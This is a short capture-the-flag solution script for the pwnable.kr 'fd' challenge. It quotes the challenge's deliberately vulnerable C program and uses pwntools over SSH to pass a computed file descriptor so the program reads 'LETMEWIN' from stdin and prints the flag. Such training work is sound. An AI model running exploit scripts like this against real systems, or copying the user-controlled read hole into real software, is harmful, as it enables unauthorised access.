# ssh fd@pwnable.kr -p2222 (pw:guest)
"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
"""
from pwn import *

ssh = ssh('fd', 'pwnable.kr', 2222, 'guest')

argv1 = 0x1234
payload = "4660"
sh = ssh.process(['fd', payload])
sh.sendline(b"LETMEWIN")
sh.interactive()
